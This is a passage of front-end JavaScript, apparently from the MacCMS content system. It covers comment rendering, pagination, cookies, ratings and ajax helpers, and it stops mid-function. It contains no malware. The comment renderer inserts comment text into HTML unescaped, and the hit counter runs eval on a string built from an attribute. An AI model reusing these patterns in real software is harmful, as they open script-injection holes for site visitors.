(function () {
    String.prototype.replaceAll = function (s1, s2) { return this.replace(new RegExp(s1, "gm"), s2); }
    String.prototype.trim = function () { return this.replace(/(^\s*)|(\s*$)/g, ""); }
    window.base64EncodeChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"; var base64DecodeChars = new Array(-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, 62, -1, -1, -1, 63, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, -1, -1, -1, -1, -1, -1, -1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, -1, -1, -1, -1, -1, -1, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, -1, -1, -1, -1, -1); function base64encode(str) { var out, i, len; var c1, c2, c3; len = str.length; i = 0; out = ""; while (i < len) { c1 = str.charCodeAt(i++) & 0xff; if (i == len) { out += base64EncodeChars.charAt(c1 >> 2); out += base64EncodeChars.charAt((c1 & 0x3) << 4); out += "=="; break } c2 = str.charCodeAt(i++); if (i == len) { out += base64EncodeChars.charAt(c1 >> 2); out += base64EncodeChars.charAt(((c1 & 0x3) << 4) | ((c2 & 0xF0) >> 4)); out += base64EncodeChars.charAt((c2 & 0xF) << 2); out += "="; break } c3 = str.charCodeAt(i++); out += base64EncodeChars.charAt(c1 >> 2); out += base64EncodeChars.charAt(((c1 & 0x3) << 4) | ((c2 & 0xF0) >> 4)); out += base64EncodeChars.charAt(((c2 & 0xF) << 2) | ((c3 & 0xC0) >> 6)); out += base64EncodeChars.charAt(c3 & 0x3F) } return out } function base64decode(str) { var c1, c2, c3, c4; var i, len, out; len = str.length; i = 0; out = ""; while (i < len) { do { c1 = base64DecodeChars[str.charCodeAt(i++) & 0xff] } while (i < len && c1 == -1); if (c1 == -1) break; do { c2 = base64DecodeChars[str.charCodeAt(i++) & 0xff] } while (i < len && c2 == -1); if (c2 == -1) break; out += String.fromCharCode((c1 << 2) | ((c2 & 0x30) >> 4)); do { c3 = str.charCodeAt(i++) & 0xff; if (c3 == 61) return out; c3 = base64DecodeChars[c3] } while (i < len && c3 == -1); if (c3 == -1) break; out += String.fromCharCode(((c2 & 0XF) << 4) | ((c3 & 0x3C) >> 2)); do { c4 = str.charCodeAt(i++) & 0xff; if (c4 == 61) return out; c4 = base64DecodeChars[c4] } while (i < len && c4 == -1); if (c4 == -1) break; out += String.fromCharCode(((c3 & 0x03) << 6) | c4) } return out } function utf16to8(str) { var out, i, len, c; out = ""; len = str.length; for (i = 0; i < len; i++) { c = str.charCodeAt(i); if ((c >= 0x0001) && (c <= 0x007F)) { out += str.charAt(i) } else if (c > 0x07FF) { out += String.fromCharCode(0xE0 | ((c >> 12) & 0x0F)); out += String.fromCharCode(0x80 | ((c >> 6) & 0x3F)); out += String.fromCharCode(0x80 | ((c >> 0) & 0x3F)) } else { out += String.fromCharCode(0xC0 | ((c >> 6) & 0x1F)); out += String.fromCharCode(0x80 | ((c >> 0) & 0x3F)) } } return out } function utf8to16(str) { var out, i, len, c; var char2, char3; out = ""; len = str.length; i = 0; while (i < len) { c = str.charCodeAt(i++); switch (c >> 4) { case 0: case 1: case 2: case 3: case 4: case 5: case 6: case 7: out += str.charAt(i - 1); break; case 12: case 13: char2 = str.charCodeAt(i++); out += String.fromCharCode(((c & 0x1F) << 6) | (char2 & 0x3F)); break; case 14: char2 = str.charCodeAt(i++); char3 = str.charCodeAt(i++); out += String.fromCharCode(((c & 0x0F) << 12) | ((char2 & 0x3F) << 6) | ((char3 & 0x3F) << 0)); break } } return out }

    window.lang = localStorage.getItem('lang')
    function __macCmtApiPhpRoot() {
        if (typeof maccms === 'undefined') {
            return '/api.php';
        }
        var base = (maccms.path || '/').replace(/\/+$/, '');
        return (base ? base + '/' : '/') + 'api.php';
    }
    function __macCmtFullUrl(pathWithQuery) {
        var host = typeof maccms !== 'undefined' && maccms.base_url ? String(maccms.base_url).replace(/\/+$/, '') : '';
        return host + pathWithQuery;
    }
    function __macCmtEscAttr(s) {
        if (s == null) {
            return '';
        }
        return String(s)
            .replace(/&/g, '&amp;')
            .replace(/"/g, '&quot;')
            .replace(/'/g, '&#39;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;');
    }
    function __macCmtEscText(s) {
        return __macCmtEscAttr(s);
    }
    function __macCmtTplFallback() {
        return (typeof maccms !== 'undefined' && maccms.path_tpl) ? maccms.path_tpl : '';
    }
    function __macCmtVerifyImgUrl() {
        var p = typeof maccms !== 'undefined' ? String(maccms.path || '') : '';
        p = p.replace(/\/+$/, '');
        var rel = (p ? p + '/' : '/') + 'index.php/verify/index.html';
        if (typeof maccms !== 'undefined' && maccms.base_url) {
            return String(maccms.base_url).replace(/\/+$/, '') + rel;
        }
        return rel;
    }
    function __macCmtBuildFormHtml() {
        var verify = window.MAC && MAC.Comment && Number(MAC.Comment.Verify) === 1;
        var vurl = __macCmtVerifyImgUrl();
        var smtInner =
            '<div class="comm_tips fl"> <span data-lang="string_pinglun_shuru">还可以输入</span> <span class="comment_remaining">200</span> <span data-lang="string_pinglun_zi">字</span> </div>';
        if (verify) {
            smtInner +=
                '<input class="comment_submit cmt_post fr" data-value="string_pinglun_fabu" type="button" value="发布">' +
                '<img class="comm-code fr" data-title="string_pinglun_kan" src="' +
                __macCmtEscAttr(vurl) +
                '" data-role="' +
                __macCmtEscAttr(vurl) +
                '" title="看不清楚? 换一张！" onClick="this.src=this.src+\'?v=\'+Date.now()"/>' +
                '<input type="text" name="verify" data-placeholder="user_yanzhengma" placeholder="验证码" class="verify fr">';
        } else {
            smtInner +=
                '<input class="comment_submit cmt_post fr" data-value="string_pinglun_fabu" type="button" value="发布">';
        }
        return (
            '<div class="part_rows_fa">' +
            '<form class="comment_form cmt_form clearfix">' +
            '<input type="hidden" name="comment_pid" value="0">' +
            '<div class="input_wrap clearfix">' +
            '<textarea class="comment_content" name="comment_content" data-placeholder="string_pinglun_wenm" placeholder="文明发言，共建和谐社会"></textarea>' +
            '<div class="smt fr clearfix">' +
            smtInner +
            '</div></div></form></div>'
        );
    }
    function __macCmtAvatarHtml(uid, portrait, name) {
        var u = Number(uid) || 0;
        var p = portrait || '';
        var n = name || '';
        var dataUser = u > 0 ? ' data-user-id="' + __macCmtEscAttr(String(u)) + '"' : '';
        var fallback = __macCmtEscAttr(__macCmtTplFallback() + '/images/member/touxiang.png');
        return (
            '<span class="mac-avatar mac-avatar--xs mac-avatar--list comm_avat part_roun"' +
            dataUser +
            '><img class="mac-avatar__img" src="' +
            __macCmtEscAttr(p) +
            '" alt="' +
            __macCmtEscAttr(n) +
            '" loading="lazy" decoding="async" onerror="this.onerror=null;this.src=\'' +
            fallback +
            '\';"></span>'
        );
    }
    function __macCmtDiggHtml(id, type, num) {
        var label = type === 'up' ? '赞' : '踩';
        var icon = type === 'up' ? '&#xe64e;' : '&#xe64f;';
        return (
            '<a class="digg_link" data-id="' +
            __macCmtEscAttr(String(id)) +
            '" data-mid="4" data-type="' +
            __macCmtEscAttr(type) +
            '" href="javascript:;" aria-label="' +
            __macCmtEscAttr(label) +
            '"><i class="iconfont" aria-hidden="true">' +
            icon +
            '</i><em class="digg_num icon-num">' +
            __macCmtEscText(String(num != null ? num : 0)) +
            '</em></a>'
        );
    }
    function __macCmtReplyRowHtml(vo, isReply) {
        var id = vo.comment_id;
        var uid = vo.user_id;
        var iso = vo.comment_time_iso || '';
        var title = vo.comment_time_title || '';
        var label = vo.comment_time_label || '';
        var ts = vo.comment_time != null ? String(vo.comment_time) : '';
        var content = vo.comment_content != null ? String(vo.comment_content) : '';
        var name = vo.comment_name != null ? String(vo.comment_name) : '';
        var up = vo.comment_up != null ? vo.comment_up : 0;
        var down = vo.comment_down != null ? vo.comment_down : 0;
        var replyBtn = isReply
            ? ''
            : '<a class="comment_reply" data-id="' +
              __macCmtEscAttr(String(id)) +
              '" href="javascript:;" data-lang="string_pinglun_huifu">回复</a>';
        var rowClass = isReply ? 'cmt-row cmt-row--reply' : 'cmt-row';
        var wrapClass = isReply ? 'comm_reply comm_reply_child comm_tops cmt-reply-item' : '';
        var inner =
            '<div class="' +
            rowClass +
            '">' +
            '<div class="cmt-avatar-wrap">' +
            __macCmtAvatarHtml(uid, vo.user_portrait, name) +
            '</div>' +
            '<div class="cmt-body">' +
            '<div class="cmt-meta"><strong class="cmt-name text_line">' +
            __macCmtEscText(name) +
            '</strong></div>' +
            '<div class="cmt-text comm_content">' +
            content +
            '</div>' +
            '<div class="cmt-footer">' +
            '<time class="cmt-time part_tips" datetime="' +
            __macCmtEscAttr(iso) +
            '" data-ts="' +
            __macCmtEscAttr(ts) +
            '" title="' +
            __macCmtEscAttr(title) +
            '">' +
            __macCmtEscText(label) +
            '</time>' +
            '<div class="gw_action cmt-actions">' +
            __macCmtDiggHtml(id, 'up', up) +
            __macCmtDiggHtml(id, 'down', down) +
            replyBtn +
            '</div></div></div></div>';
        if (isReply) {
            return '<div class="' + wrapClass + '">' + inner + '</div>';
        }
        return inner;
    }
    function __macCmtThreadHtml(vo) {
        var main = __macCmtReplyRowHtml(vo, false);
        var subs = vo.sub || [];
        var subParts = [];
        for (var i = 0; i < subs.length; i++) {
            subParts.push(__macCmtReplyRowHtml(subs[i], true));
        }
        return (
            '<li class="comm_each line_top margin cmt-thread">' +
            main +
            '<div class="comm_cont cmt-replies">' +
            subParts.join('') +
            '</div></li>'
        );
    }
    function __macCmtPageWindow(cur, total) {
        var out = [];
        var from = Math.max(1, cur - 2);
        var to = Math.min(total, cur + 2);
        var i;
        if (from > 1) {
            out.push(1);
            if (from > 2) {
                out.push('…');
            }
        }
        for (i = from; i <= to; i++) {
            out.push(i);
        }
        if (to < total) {
            if (to < total - 1) {
                out.push('…');
            }
            out.push(total);
        }
        return out;
    }
    function __macCmtPagerHtml(page, pagecount, total) {
        if (pagecount <= 1) {
            return '';
        }
        var prev = page > 1 ? page - 1 : 1;
        var next = page < pagecount ? page + 1 : pagecount;
        var nums = __macCmtPageWindow(page, pagecount);
        var liNums = [];
        var j;
        for (j = 0; j < nums.length; j++) {
            var n = nums[j];
            if (n === '…') {
                liNums.push('<li class="hidden_xs"><span class="page_link">…</span></li>');
                continue;
            }
            if (n === page) {
                liNums.push(
                    '<li class="hidden_xs active"><a class="page_link page_current" href="javascript:;" title="' +
                        __macCmtEscAttr(String(n)) +
                        '">' +
                        __macCmtEscText(String(n)) +
                        '</a></li>'
                );
            } else {
                liNums.push(
                    '<li class="hidden_xs"><a class="page_link" href="javascript:void(0)" onclick="MAC.Comment.Show(' +
                        n +
                        ')" title="' +
                        __macCmtEscAttr(String(n)) +
                        '">' +
                        __macCmtEscText(String(n)) +
                        '</a></li>'
                );
            }
        }
        return (
            '<ul class="page text_center cleafix">' +
            '<li><a href="javascript:void(0);" onclick="MAC.Comment.Show(1)" data-title="string_home" data-lang="string_home" title="首页"' +
            (page === 1 ? ' class="btns_disad"' : '') +
            '>首页</a></li>' +
            '<li><a href="javascript:void(0);" data-lang="string_syy" data-title="string_syy" onclick="MAC.Comment.Show(' +
            prev +
            ')" title="上一页"' +
            (page === 1 ? ' class="btns_disad"' : '') +
            '>上一页</a></li>' +
            liNums.join('') +
            '<li class="hidden_xs active"><span class="num btns_disad">' +
            page +
            '/' +
            pagecount +
            '</span></li>' +
            '<li><a href="javascript:void(0)" onclick="MAC.Comment.Show(' +
            next +
            ')" title="下一页"' +
            (page === pagecount ? ' class="btns_disad"' : '') +
            ' data-title="string_xyy" data-lang="string_xyy">下一页</a></li>' +
            '<li><a href="javascript:void(0)" onclick="MAC.Comment.Show(' +
            pagecount +
            ')" title="尾页"' +
            (page === pagecount ? ' class="btns_disad"' : '') +
            ' data-lang="string_last_page" data-title="string_last_page">尾页</a></li></ul>' +
            '<div class="page_tips hidden_mb">' +
            '<span data-lang="string_vod_zg">共</span> <span>' +
            __macCmtEscText(String(total)) +
            '</span> <span data-lang="string_pinglun_shuj">条数据</span> &nbsp;/&nbsp; ' +
            '<span data-lang="string_pinglun_dangq">当前</span> ' +
            page +
            '/' +
            pagecount +
            ' <span data-lang="string_page">页</span></div>'
        );
    }
    function __macCmtEmptyHtml() {
        return (
            '<div class="no-message">' +
            '<div class="message-img"></div>' +
            '<p data-lang="string_pinglun_zanwu">暂无留言</p></div>'
        );
    }
    function __macCmtAfterInjectOne($box) {
        $box.find('.part_rows_fa .comment_content').off('click.macCmtApi').on('click.macCmtApi', function () {
            $box.find('.part_rows_fa .smt').addClass('smt_hidn');
        });
        try {
            if (typeof tplconfig !== 'undefined' && tplconfig.commentUi) {
                if (tplconfig.commentUi.applyRepliesFold) {
                    tplconfig.commentUi.applyRepliesFold($box);
                }
                if (tplconfig.commentUi.refreshRelativeTimes) {
                    tplconfig.commentUi.refreshRelativeTimes($box);
                }
            }
            if (typeof tplconfig !== 'undefined' && tplconfig.macAvatarVip && tplconfig.macAvatarVip.refresh) {
                tplconfig.macAvatarVip.refresh($box);
            }
        } catch (e1) { }
    }
    function __macCmtAfterInjectAll($boxes) {
        try {
            var lang = localStorage.getItem('lang');
            if (typeof language_pack !== 'undefined' && language_pack.loadProperties) {
                language_pack.loadProperties(lang);
            }
        } catch (e0) { }
        $boxes.each(function () {
            __macCmtAfterInjectOne($(this));
        });
    }
    function __macCmtUseSsr($box) {
        return $box && $box.length && $box.attr('data-comment-ssr') === '1';
    }
    function __macCmtLoadList($boxes, page) {
        if (!$boxes || !$boxes.length) {
            return;
        }
        var $box = $boxes.first();
        var rid = $box.attr('data-id');
        var mid = $box.attr('data-mid');
        if (!rid || !mid) {
            return;
        }
        var limit = parseInt($box.attr('data-comment-limit'), 10);
        if (!limit || limit < 1) {
            limit = 5;
        }
        var orderby = ($box.attr('data-comment-orderby') || 'id').trim();
        page = parseInt(page, 10);
        if (!page || page < 1) {
            page = 1;
        }
        var offset = (page - 1) * limit;
        var qs =
            'rid=' +
            encodeURIComponent(rid) +
            '&mid=' +
            encodeURIComponent(mid) +
            '&offset=' +
            offset +
            '&limit=' +
            limit +
            '&orderby=' +
            encodeURIComponent(orderby);
        var url = __macCmtFullUrl(__macCmtApiPhpRoot() + '/comment/get_list?' + qs);
        $.ajax({
            url: url,
            type: 'GET',
            dataType: 'json',
            timeout: 8000,
            success: function (r) {
                if (!r || Number(r.code) !== 1 || !r.info) {
                    var err =
                        '<a href="javascript:void(0)" onclick="MAC.Comment.Show(' +
                        page +
                        ')">评论加载失败，点击我刷新...</a>';
                    $boxes.html(err);
                    return;
                }
                var info = r.info;
                var rows = info.rows || [];
                var total = Number(info.total) || 0;
                var pagecount = Number(info.pagecount) || 0;
                var curPage = Number(info.page) || page;
                var parts = [__macCmtBuildFormHtml()];
                if (total < 1) {
                    parts.push(__macCmtEmptyHtml());
                } else {
                    parts.push('<ul class="part_rows">');
                    var i;
                    for (i = 0; i < rows.length; i++) {
                        parts.push(__macCmtThreadHtml(rows[i]));
                    }
                    parts.push('</ul>');
                    parts.push(__macCmtPagerHtml(curPage, pagecount, total));
                }
                var html = parts.join('');
                $boxes.html(html);
                $('.mac_total').html(String(total));
                __macCmtAfterInjectAll($boxes);
            },
            error: function () {
                $boxes.html(
                    '<a href="javascript:void(0)" onclick="MAC.Comment.Show(' + page + ')">评论加载失败，点击我刷新...</a>'
                );
            },
        });
    }
    function __macCommCodeRefreshSrc() {
        var $img = $('.comm-code').first();
        if (!$img.length) {
            return;
        }
        var role = $img.attr('data-role') || $img.attr('src') || '';
        if (!role) {
            return;
        }
        var base = role.split('?')[0];
        $img.attr('src', base + '?v=' + Date.now());
    }
    window.MAC = {
        'Url': document.URL,
        'Title': document.title,
        'UserAgent': function () {
            var ua = navigator.userAgent;//navigator.appVersion
            return {
                'mobile': !!ua.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
                'ios': !!ua.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
                'android': ua.indexOf('Android') > -1 || ua.indexOf('Linux') > -1, //android终端或者uc浏览器
                'iPhone': ua.indexOf('iPhone') > -1 || ua.indexOf('Mac') > -1, //是否为iPhone或者QQHD浏览器
                'iPad': ua.indexOf('iPad') > -1, //是否iPad
                'trident': ua.indexOf('Trident') > -1, //IE内核
                'presto': ua.indexOf('Presto') > -1, //opera内核
                'webKit': ua.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
                'gecko': ua.indexOf('Gecko') > -1 && ua.indexOf('KHTML') == -1, //火狐内核
                'weixin': ua.indexOf('MicroMessenger') > -1 //是否微信 ua.match(/MicroMessenger/i) == "micromessenger",
            };
        }(),
        'Copy': function (s) {
            if (window.clipboardData) { window.clipboardData.setData("Text", s); }
            else {
                if ($("#mac_flash_copy").get(0) == undefined) { $('<div id="mac_flash_copy"></div>'); } else { $('#mac_flash_copy').html(''); }
                $('#mac_flash_copy').html('<embed src="' + (maccms.path_assets || maccms.path) + 'static/images/_clipboard.swf" FlashVars="clipboard=' + escape(s) + '" width="0" height="0" type="application/x-shockwave-flash"></embed>');
            }
            MAC.Pop.Msg(100, 20, lang == 1 ? 'Copy succeeded' : '复制成功', 1000);
        },
        'alert': function (message, options) {
            options = options || {};
            var msg = message == null ? '' : String(message);
            var width = options.width || 300;
            var height = options.height || 50;
            var timeout = options.timeout || 2000;
            if (window.MAC && MAC.Pop && typeof MAC.Pop.Msg === 'function') {
                MAC.Pop.Msg(width, height, msg, timeout);
                return;
            }
            if (typeof window.alert === 'function') {
                window.alert(msg);
            }
        },
        'confirm': function (message, onConfirm, onCancel, options) {
            options = options || {};
            var msg = message == null ? '' : String(message);
            var okText = options.okText || (window.lang == 1 ? 'Confirm' : '确定');
            var cancelText = options.cancelText || (window.lang == 1 ? 'Cancel' : '取消');

            $('.mac_confirm_overlay').remove();

            var html = ''
                + '<div class="mac_confirm_overlay">'
                + '  <div class="mac_confirm_dialog" role="dialog" aria-modal="true">'
                + '    <div class="mac_confirm_icon">!</div>'
                + '    <div class="mac_confirm_message"></div>'
                + '    <div class="mac_confirm_actions">'
                + '      <button type="button" class="mac_confirm_btn mac_confirm_btn_cancel"></button>'
                + '      <button type="button" class="mac_confirm_btn mac_confirm_btn_ok"></button>'
                + '    </div>'
                + '  </div>'
                + '</div>';
            $('body').append(html);

            var $overlay = $('.mac_confirm_overlay').last();
            (function () {
                var el = $overlay.get(0);
                if (!el || typeof MAC.setZIndexImportant !== 'function') return;
                function applyConfirmZ() {
                    if (!el || !el.parentNode) return;
                    var zb = typeof MAC.nextOverlayZBase === 'function' ? MAC.nextOverlayZBase({ exclude: '.mac_confirm_overlay' }) : 19891014;
                    zb = typeof MAC.clampOverlayZAboveRecharge === 'function' ? MAC.clampOverlayZAboveRecharge(zb) : zb;
                    zb = typeof MAC.bumpZAbovePopLayers === 'function' ? MAC.bumpZAbovePopLayers(zb) : zb;
                    if (typeof options.minZ === 'number' && !isNaN(options.minZ)) zb = Math.max(zb, options.minZ);
                    MAC.setZIndexImportant(el, zb);
                }
                applyConfirmZ();
                if (typeof requestAnimationFrame === 'function') {
                    requestAnimationFrame(applyConfirmZ);
                }
            })();
            $overlay.find('.mac_confirm_message').text(msg);
            $overlay.find('.mac_confirm_btn_cancel').text(cancelText);
            $overlay.find('.mac_confirm_btn_ok').text(okText);

            var closed = false;
            function closeWith(result) {
                if (closed) return;
                closed = true;
                $overlay.remove();
                if (result) {
                    if (typeof onConfirm === 'function') onConfirm();
                } else {
                    if (typeof onCancel === 'function') onCancel();
                }
            }

            $overlay.on('click', '.mac_confirm_btn_ok', function () { closeWith(true); });
            $overlay.on('click', '.mac_confirm_btn_cancel', function () { closeWith(false); });
            $overlay.on('click', function (e) {
                if (e.target === this) closeWith(false);
            });
            $(document).off('keydown.macConfirm').on('keydown.macConfirm', function (e) {
                if (!$overlay.length) return;
                if (e.key === 'Escape') {
                    e.preventDefault();
                    closeWith(false);
                } else if (e.key === 'Enter') {
                    e.preventDefault();
                    closeWith(true);
                }
                if (closed) $(document).off('keydown.macConfirm');
            });
        },
        'Home': function (o, u) {
            try {
                o.style.behavior = 'url(#default#homepage)'; o.setHomePage(u);
            }
            catch (e) {
                if (window.netscape) {
                    try { netscape.security.PrivilegeManager.enablePrivilege("UniversalXPConnect"); }
                    catch (e) { MAC.Pop.Msg(150, 40, lang == 1 ? 'This operation is rejected by the browser! Please set it manually' : '此操作被浏览器拒绝！请手动设置', 1000); }
                    var moz = Components.classes['@mozilla.org/preferences-service;1'].getService(Components.interfaces.nsIPrefBranch);
                    moz.setCharPref('browser.startup.homepage', u);
                }
            }
        },
        'Fav': function (u, s) {
            try { window.external.addFavorite(u, s); }
            catch (e) {
                try { window.sidebar.addPanel(s, u, ""); } catch (e) { MAC.Pop.Msg(150, 40, lang == 1 ? 'Error adding collection, please use keyboard Ctrl + D to add' : '加入收藏出错，请使用键盘Ctrl+D进行添加', 1000); }
            }
        },
        'Open': function (u, w, h) {
            window.open(u, 'macopen1', 'toolbars=0, scrollbars=0, location=0, statusbars=0,menubars=0,resizable=yes,width=' + w + ',height=' + h + '');
        },
        'Cookie': {
            'Set': function (name, value, days) {
                var exp = new Date();
                exp.setTime(exp.getTime() + days * 24 * 60 * 60 * 1000);
                var arr = document.cookie.match(new RegExp("(^| )" + name + "=([^;]*)(;|$)"));
                document.cookie = name + "=" + encodeURIComponent(value) + ";path=/;expires=" + exp.toUTCString();
            },
            'Get': function (name) {
                var arr = document.cookie.match(new RegExp("(^| )" + name + "=([^;]*)(;|$)"));
                if (arr != null) { return decodeURIComponent(arr[2]); return null; }
            },
            'Del': function (name) {
                var exp = new Date();
                exp.setTime(exp.getTime() - 1);
                var cval = this.Get(name);
                if (cval != null) { document.cookie = name + "=" + encodeURIComponent(cval) + ";path=/;expires=" + exp.toUTCString(); }
            }
        },
        'GoBack': function () {
            var ldghost = document.domain;
            if (document.referrer.indexOf(ldghost) > 0) {
                history.back();
            }
            else {
                window.location = "//" + ldghost;
            }
        },
        'Adaptive': function () {
            if (maccms.mob_status == '1' && maccms.url != maccms.wapurl) {
                if (document.domain == maccms.url && MAC.UserAgent.mobile) {
                    location.href = location.href.replace(maccms.url, maccms.wapurl);
                }
                else if (document.domain == maccms.wapurl && !MAC.UserAgent.mobile) {
                    location.href = location.href.replace(maccms.wapurl, maccms.url);
                }
            }
        },
        'CheckBox': {
            'All': function (n) {
                $("input[name='" + n + "']").each(function () {
                    this.checked = true;
                });
            },
            'Other': function (n) {
                $("input[name='" + n + "']").each(function () {
                    this.checked = !this.checked;
                });
            },
            'Count': function (n) {
                var res = 0;
                $("input[name='" + n + "']").each(function () {
                    if (this.checked) { res++; }
                });
                return res;
            },
            'Ids': function (n) {
                var res = [];
                $("input[name='" + n + "']").each(function () {
                    if (this.checked) { res.push(this.value); }
                });
                return res.join(",");
            }
        },
        'Ajax': function (url, type, dataType, data, sfun, efun, cfun) {
            type = type || 'get';
            dataType = dataType || 'json';
            data = data || '';
            efun = efun || '';
            cfun = cfun || '';

            $.ajax({
                url: url,
                type: type,
                dataType: dataType,
                data: data,
                timeout: 5000,
                beforeSend: function (XHR) {

                },
                error: function (XHR, textStatus, errorThrown) {
                    if (efun) efun(XHR, textStatus, errorThrown);
                },
                success: function (data) {
                    sfun(data);
                },
                complete: function (XHR, TS) {
                    if (cfun) cfun(XHR, TS);
                }
            })
        },
        'Qrcode': {
            'Init': function () {
                $('.mac_qrcode').attr('src', '//api.maccms.com/qrcode/?w=150&h=150&url=' + MAC.Url);
            }
        },
        'Shorten': {
            'Init': function () {
                if ($('.mac_shorten').length == 0) {
                    return;
                }
                MAC.Shorten.Get();
            },
            'Get': function (url, call) {
                url = url || location.href;
                MAC.Ajax('//api.maccms.com/shorten/?callback=callback&url=' + encodeURIComponent(url), 'get', 'jsonp', '', function (r) {
                    if (r.code == 1) {
                        if ($('.mac_shorten').length > 0) {
                            $('.mac_shorten').val(r.data.url_short);
                            $('.mac_shorten').html(r.data.url_short);
                        }
                        if (call) {
                            call(r);
                        }

                    }
                });
            }
        },
        'Image': {
            'Lazyload': {
                'Show': function () {
                    try {
                        if (typeof window.macVanillaLazyUpdate === 'function') {
                            window.macVanillaLazyUpdate();
                        } else {
                            $("img.lazy").lazyload({ placeholder: (typeof maccms !== 'undefined' && maccms.lazyImg ? maccms.lazyImg : '') });
                        }
                    } catch (e) { }
                },
                'Box': function ($id) {
                    try {
                        if (typeof window.macVanillaLazyBox === 'function') {
                            window.macVanillaLazyBox($id);
                        } else {
                            $("img.lazy").lazyload({
                                container: $("#" + $id),
                                placeholder: (typeof maccms !== 'undefined' && maccms.lazyImg ? maccms.lazyImg : '')
                            });
                        }
                    } catch (e2) { }
                }
            }
        },
        'Verify': {
            'Init': function () {
                MAC.Verify.Focus();
                MAC.Verify.Click();
            },
            'Focus': function () {//验证码框焦点
                $('body').on("focus", ".mac_verify", function () {
                    $(this).removeClass('mac_verify').after(MAC.Verify.Show());
                    $(this).unbind();
                });
            },
            'Click': function () {//点击刷新
                $('body').on('click', 'img.mac_verify_img', function () {
                    $(this).attr('src', maccms.base_url + '/index.php/verify/index.html?r=' + Math.random());
                });
            },
            'Refresh': function () {
                $('.mac_verify_img').attr('src', maccms.base_url + '/index.php/verify/index.html?r=' + Math.random());
            },
            'Show': function () {
                return '<img class="mac_verify_img" src="' + maccms.base_url + '/index.php/verify/index.html?"  title="看不清楚? 换一张！">';
            }
        },
        'PageGo': {
            'Init': function () {
                $('.mac_page_go').click(function () {
                    var that = $(this);
                    var url = that.attr('data-url');
                    var total = parseInt(that.attr('data-total'));
                    var sp = that.attr('data-sp');
                    var page = parseInt($('#page').val());

                    if (page > 0 && (page <= total)) {
                        url = url.replace(sp + 'PAGELINK', sp + page).replace('PAGELINK', page);
                        location.href = url;
                    }
                    return false;
                });
            }
        },
        'Hits': {
            'Init': function () {
                if ($('.mac_hits').length == 0) {
                    return;
                }
                var $that = $(".mac_hits");

                MAC.Ajax(maccms.base_url + '/index.php/ajax/hits?mid=' + $that.attr("data-mid") + '&id=' + $that.attr("data-id") + '&type=update', 'get', 'json', '', function (r) {
                    if (r.code == 1) {
                        $(".mac_hits").each(function (i) {
                            $type = $(".mac_hits").eq(i).attr('data-type');
                            if ($type != 'insert') {
                                $('.' + $type).html(eval('(r.data.' + $type + ')'));
                            }
                        });
                    }
                });

            }
        },
        'Score': {
            'Init': function () {
                if ($('.mac_score').length == 0) {
                    return;
                }
                $('body').on('click', '.score_btn', function (e) {
                    MAC.Score.Submit();
                });

                MAC.Ajax(maccms.base_url + '/index.php/ajax/score?mid=' + $('.mac_score').attr('data-mid') + '&id=' + $('.mac_score').attr('data-id'), 'post', 'json', '', function (r) {
                    MAC.Score.View(r);
                }, function () {
                    $(".mac_score").html(lang == 1 ? 'Score loading failed' : '评分加载失败');
                });

            },
            'Submit': function () {
                var $s = $('.mac_score').find("input[name='score']").val();
                MAC.Ajax(maccms.base_url + '/index.php/ajax/score?mid=' + $('.mac_score').attr('data-mid') + '&id=' + $('.mac_score').attr('data-id') + '&score=' + $s, 'get', 'json', '', function (r) {
                    MAC.Pop.Msg(100, 20, r.msg, 1000);
                    if (r.code == 1) {
                        MAC.Score.View(r);
                    }
                });
            },
            'View': function (r) {
                $(".rating" + Math.floor(r.data.score)).attr('checked', true);
                $(".score_num").text(r.data.score_num);
                $(".score_all").text(r.data.score_all);
                $(".score_pjf").text(r.data.score);
            }
        },
        'Star': {
            'Init': function () {
                if ($('.mac_star').length == 0) {
                    return;
                }

                $('.mac_star').raty({
                    starType: 'i',
                    number: 5,
                    numberMax: 5,
                    half: true,
                    score: function () {
                        return $(this).attr('data-score');
                    },
                    click: function (score, evt) {
                        MAC.Ajax(maccms.base_url + '/index.php/ajax/score?mid=' + $('.mac_star').attr('data-mid') + '&id=' + $('.mac_star').attr('data-id') + '&score=' + (score * 2), 'get', 'json', '', function (r) {
                            if (json.status == 1) {
                                $('.star_tips').html(r.data.score);
                            } else {
                                $('.star_box').attr('title', r.msg);
                            }
                        }, function () {
                            $('.star_box').attr('title', lang == 1 ? 'Network exception!' : '网络异常！');
                        });

                    }
                });
            }
        },
        'Digg': {
            'Init': function () {
                $('body').on('click', '.digg_link', function (e) {
                    var $that = $(this);
                    if ($that.attr("data-id")) {
                        MAC.Ajax(maccms.base_url + '/index.php/ajax/digg.html?mid=' + $that.attr("data-mid") + '&id=' + $that.attr("data-id") + '&type=' + $that.attr("data-type"), 'get', 'json', '', function (r) {
                            $that.addClass('disabled');
                            console.log(r)
                            if (r.code == 1) {
                                if ($that.attr("data-type") == 'up') {
                                    $that.find('.digg_num').html(r.data.up);
                                    $that.addClass('is_click')
                                    $that.find('.is_digg').html(lang == 1 ? 'Liked' : '已赞')
                                }
                                else {
                                    $that.find('.digg_num').html(r.data.down);
                                }
                            } else {
                                $that.attr('title', r.msg);
                            }
                        });
                    }
                });
            }
        },
        'Gbook': {
            'Login': 0,
            'Verify': 0,
            'Init': function () {
                $('body').on('keyup', '.gbook_content', function (e) {
                    MAC.Remaining($(this), 200, '.gbook_remaining')
                });
                $('body').on('focus', '.gbook_content', function (e) {
                    if (MAC.Gbook.Login == 1 && MAC.User.IsLogin != 1) {
                        MAC.User.Login();
                    }
                });
                $('body').on('click', '.gbook_submit', function (e) {
                    MAC.Gbook.Submit();
                });
            },
            'Show': function ($page) {
                MAC.Ajax(maccms.base_url + '/index.php/gbook/index?page=' + $page, 'post', 'json', '', function (r) {
